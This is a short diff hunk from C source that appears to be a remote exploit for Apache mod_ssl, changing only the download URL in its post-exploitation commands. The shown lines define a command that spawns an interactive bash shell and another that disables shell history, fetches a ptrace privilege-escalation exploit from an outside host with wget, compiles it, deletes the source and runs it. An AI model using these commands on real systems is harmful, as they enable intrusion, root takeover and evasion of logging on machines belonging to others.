@@ -670,7 +670,7 @@ typedef struct {
 #define COMMAND1 "TERM=xterm; export TERM=xterm; exec bash -i\n"
 // #define COMMAND2 "unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"
 
-#define COMMAND2 "unset HISTFILE; cd /tmp; wget https://raw.githubusercontent.com/rony926/Apache_mod_ssl-_2.8.7-_Remote-Buffer-Overflow/refs/heads/main/backfile.c -O ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"
+#define COMMAND2 "unset HISTFILE; cd /tmp; wget https://raw.githubusercontent.com/rony926/exploit_backfile/refs/heads/main/backfile.c -O ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"
 
 long getip(char *hostname) {
 	struct hostent *he;
